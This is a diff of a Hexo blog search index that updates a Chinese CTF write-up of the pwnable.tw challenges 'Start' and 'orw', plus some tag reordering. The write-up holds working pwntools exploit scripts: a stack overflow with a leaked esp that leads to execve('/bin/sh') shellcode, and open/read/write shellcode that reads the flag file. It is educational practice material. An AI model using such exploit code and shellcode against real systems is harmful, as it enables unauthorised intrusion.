@@ -3,7 +3,7 @@
   <entry>
     <title><![CDATA[Pwn tw 刷题记录]]></title>
     <url>%2F2019%2F09%2F13%2FPwn-tw-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%2F</url>
-    <content type="text"><![CDATA[简介最近因为保研的事情弄得自己心急气躁的，学习效率几乎为0。决定还是写篇博客找找学习的感觉，也自己立下个flag，争取每天都在pwntw刷一道题，好好学习下pwn。 Start题目描述 Just a start.nc chall.pwnable.tw 10000 基本信息file检查一下，32位，动态链接 checksec一下，没有任何保护 ida打开如下： 解题思路F5出来之后的东西有点奇怪，所以直接看汇编12345678910111213141516171819202122232425public _start_start proc nearpush esppush offset _exitxor eax, eaxxor ebx, ebxxor ecx, ecxxor edx, edxpush 3A465443hpush 20656874hpush 20747261hpush 74732073hpush 2774654Chmov ecx, esp ; addrmov dl, 14h ; lenmov bl, 1 ; fdmov al, 4int 80h ; LINUX - sys_writexor ebx, ebxmov dl, 3Chmov al, 3int 80h ; LINUX -add esp, 14hretn_start endp ; sp-analysis failed 程序逻辑大概就是首先将需要的参数传入寄存器，然后执行系统调用，根据这里的查找，可以确定第一个系统调用为sys_write 其中eax为系统调用参数，0x4便是sys_write。ebx为fd，这里是1。ecx为buf，这里为esp。edx为size，这里为0x14 这里就是将Let&#39;s start the CTF:这句话压入栈，然后通过sys_write打印到bash中 之后程序又将ebx置零，然后将edx改为0x3c，eax改为0x3。这里也就是代表捕获bash中的输入并且覆盖到esp上面去 经过gdb调试，我发现也的确是这样的 其中0xffffcdc8处也就是返回地址 那么这便是简单的栈溢出，由于没有开启nx，我们可以将shellcode写入栈上，然后控制返回地址到shellcode即可，其中偏移为20 但是由于我们的shellcode普遍大于20，那么我们写只能写在返回地址之后，shellcode可以在这里寻找 不过这里还有个问题便是如何获取栈地址，我注意到汇编代码中有这么一句 1mov ecx, esp ; addr 在retn的时候如果我们控制返回地址到这里，那么接下来程序便会将此时的esp打印出来，这样我们便可以获得当前的esp地址，然后便可以算出shellcode的位置 PS:这里需要注意不能用sendline函数，因为sendline会把当前的esp中的内容覆盖掉，这样就获取不了esp的值了 exp 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *from pwnlib import gdbcontext.terminal = ['gnome-terminal','-x','sh','-c']context.log_level = 'debug'r = process('./start')gdb.attach(r)sd = lambda x : r.send(x)sl = lambda x : r.sendline(x)rv = lambda x = 2048 : r.recv(x)ru = lambda x : r.recvuntil(x)rl = lambda : r.recvline()ia = lambda : r.interactive()ra = lambda : r.recvall()sla = lambda x,y: r.sendlineafter(x,y)sa = lambda x,y : r.sendafter(x,y)offset = 20ru('Let\'s start the CTF:')write_addr = 0x08048087payload = 'A'*offset + p32(write_addr)sd(payload)esp_addr = u32(rv(4))print('[+]Esp_addr: '+hex(esp_addr))shellcode = asm('\n'.join([ 'push %d' % u32('/sh\0'), 'push %d' % u32('/bin'), 'xor edx, edx', 'xor ecx, ecx', 'mov ebx, esp', 'mov eax, 0xb', 'int 0x80',]))payload = 'A'*offset + p32(esp_addr+20) + shellcodesd(payload)ia()]]></content>
+    <content type="text"><![CDATA[简介最近因为保研的事情弄得自己心急气躁的，学习效率几乎为0。决定还是写篇博客找找学习的感觉，也自己立下个flag，争取每天都在pwntw刷一道题，好好学习下pwn。 Start题目描述 Just a start.nc chall.pwnable.tw 10000 基本信息file检查一下，32位，动态链接 checksec一下，没有任何保护 ida打开如下： 解题思路F5出来之后的东西有点奇怪，所以直接看汇编12345678910111213141516171819202122232425public _start_start proc nearpush esppush offset _exitxor eax, eaxxor ebx, ebxxor ecx, ecxxor edx, edxpush 3A465443hpush 20656874hpush 20747261hpush 74732073hpush 2774654Chmov ecx, esp ; addrmov dl, 14h ; lenmov bl, 1 ; fdmov al, 4int 80h ; LINUX - sys_writexor ebx, ebxmov dl, 3Chmov al, 3int 80h ; LINUX -add esp, 14hretn_start endp ; sp-analysis failed 程序逻辑大概就是首先将需要的参数传入寄存器，然后执行系统调用，根据这里的查找，可以确定第一个系统调用为sys_write 其中eax为系统调用参数，0x4便是sys_write。ebx为fd，这里是1。ecx为buf，这里为esp。edx为size，这里为0x14 这里就是将Let&#39;s start the CTF:这句话压入栈，然后通过sys_write打印到bash中 之后程序又将ebx置零，然后将edx改为0x3c，eax改为0x3。这里也就是代表捕获bash中的输入并且覆盖到esp上面去 经过gdb调试，我发现也的确是这样的 其中0xffffcdc8处也就是返回地址 那么这便是简单的栈溢出，由于没有开启nx，我们可以将shellcode写入栈上，然后控制返回地址到shellcode即可，其中偏移为20 但是由于我们的shellcode普遍大于20，那么我们写只能写在返回地址之后，shellcode可以在这里寻找 不过这里还有个问题便是如何获取栈地址，我注意到汇编代码中有这么一句 1mov ecx, esp ; addr 在retn的时候如果我们控制返回地址到这里，那么接下来程序便会将此时的esp打印出来，这样我们便可以获得当前的esp地址，然后便可以算出shellcode的位置 PS:这里需要注意不能用sendline函数，因为sendline会把当前的esp中的内容覆盖掉，这样就获取不了esp的值了 解题脚本123456789101112131415161718192021222324252627282930313233343536373839from pwn import *from pwnlib import gdbcontext.terminal = ['gnome-terminal','-x','sh','-c']context.log_level = 'debug'r = process('./start')gdb.attach(r)sd = lambda x : r.send(x)sl = lambda x : r.sendline(x)rv = lambda x = 2048 : r.recv(x)ru = lambda x : r.recvuntil(x)rl = lambda : r.recvline()ia = lambda : r.interactive()ra = lambda : r.recvall()sla = lambda x,y: r.sendlineafter(x,y)sa = lambda x,y : r.sendafter(x,y)offset = 20ru('Let\'s start the CTF:')write_addr = 0x08048087payload = 'A'*offset + p32(write_addr)sd(payload)esp_addr = u32(rv(4))print('[+]Esp_addr: '+hex(esp_addr))shellcode = asm('\n'.join([ 'push %d' % u32('/sh\0'), 'push %d' % u32('/bin'), 'xor edx, edx', 'xor ecx, ecx', 'mov ebx, esp', 'mov eax, 0xb', 'int 0x80',]))payload = 'A'*offset + p32(esp_addr+20) + shellcodesd(payload)ia() orw题目描述 Read the flag from /home/orw/flag.Only open read write syscall are allowed to use.nc chall.pwnable.tw 10001 基本信息file检查一下，32位，动态链接 checksec一下，开启了Canary和Part relro ida打开如下： 解题思路正如题目表述的那样，我们只能使用open/read/write三个syscall，限制他们的也正是orw_seccomp函数 那么思路也很清楚，open打开flag文件，read读取文件，write打印文件内容 首先我们看open函数，eax为0x5；ebx为文件名；ecx为flags，也就是open的第二个参数；edx为mode；在执行了open之后，fd便存储在eax 那么我们可以这样编写shellcode123456789# fd = open(&apos;/home/orw/flag&apos;,0)mov ecx,0mov eax,SYS_opencall here.string &quot;/home/orw/flag&quot;.byte 0here:pop ebxint 0x80 然后我们看read函数，eax为0x3；ebx为fd，也就是open之后的eax；ecx为buf；edx为count，也就是size vmmap看一下，bss段可读可写可执行，我们可以把文件内容写入bss段 那么我们可以这样编写shellcode123456# read(fd,bss+0x40,0x40)mov ebx,eaxmov eax,SYS_readmov ecx,0x0804A100mov edx,0x40int 0x80 最后我们看write函数，eax为0x4，ebx为fd，输出到屏幕就是1；ecx为buf；edx为vien，也就是size 那么我们可以这样编写shellcode123456#write(1,bss+0x40,0x40)mov ebx,0x1mov eax,SYS_writemov ecx,0x0804A100mov edx,0x40int 0x80 解题脚本123456789101112131415161718192021222324252627282930313233343536373839from pwn import *# r = process('./orw')r = remote('chall.pwnable.tw', 10001)sd = lambda x : r.send(x)sl = lambda x : r.sendline(x)rv = lambda x = 2048 : r.recv(x)ru = lambda x : r.recvuntil(x)rl = lambda : r.recvline()ia = lambda : r.interactive()ra = lambda : r.recvall()sla = lambda x,y: r.sendlineafter(x,y)sa = lambda x,y : r.sendafter(x,y)ru('shellcode:')code = ''' mov ecx,0 mov eax,SYS_open call here .string "/home/orw/flag" .byte 0 here: pop ebx int 0x80 mov ebx,eax mov eax,SYS_read mov ecx,0x0804A100 mov edx,0x40 int 0x80 mov ebx,0x1 mov eax,SYS_write mov ecx,0x0804A100 mov edx,0x40 int 0x80 '''shellcode=asm(code,arch="i386")sd(shellcode)ia()]]></content>
       <categories>
         <category>Pwn</category>
       </categories>
@@ -45,8 +45,8 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>Crypto</tag>
         <tag>Write up</tag>
+        <tag>Crypto</tag>
         <tag>ECC</tag>
         <tag>Knapsack</tag>
       </tags>
@@ -73,8 +73,8 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>Crypto</tag>
         <tag>Write up</tag>
+        <tag>Crypto</tag>
         <tag>AES</tag>
       </tags>
   </entry>
@@ -87,8 +87,8 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>Crypto</tag>
         <tag>Write up</tag>
+        <tag>Crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -100,8 +100,8 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>Crypto</tag>
         <tag>Write up</tag>
+        <tag>Crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -126,8 +126,8 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>Write up</tag>
         <tag>Web</tag>
+        <tag>Write up</tag>
       </tags>
   </entry>
   <entry>
@@ -152,8 +152,8 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>Crypto</tag>
         <tag>Write up</tag>
+        <tag>Crypto</tag>
       </tags>
   </entry>
   <entry>
